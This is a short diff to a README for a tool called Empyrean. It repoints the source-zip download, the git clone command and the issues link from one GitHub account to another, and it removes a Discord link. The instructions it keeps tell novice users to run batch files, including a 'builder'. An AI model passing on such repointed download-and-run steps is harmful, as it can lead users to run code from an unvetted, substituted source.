@@ -58,7 +58,7 @@
 <details>
     <summary>For dummies</summary>
     <ol>
-        <li><a href="https://github.com/addi00000/empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
+        <li><a href="https://github.com/AnzaxCR/Empyrean/archive/refs/heads/main.zip">Download source code zip</a></li>
         <li>Extract zip</li>
         <li>Run <code>install_python.bat</code></li>
         <li>Run the builder by double clicking the <code>build.bat</code> file</li>
@@ -68,7 +68,7 @@
 <br>
 
 ```bash
-git clone https://github.com/addi00000/empyrean.git
+git clone https://github.com/AnzaxCR/Empyrean.git
 cd empyrean
 ./build.bat
 ```
@@ -100,7 +100,6 @@ Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a
 
 
 ## Errors?
-- Make an [issue](https://github.com/addi00000/empyrean/issues)
-- Join the [Discord](https://discord.gg/vdwxZNr9H7)
+- Make an [issue](https://github.com/AnzaxCR/Empyrean/issues)
 
 <img src="img/footer.png">
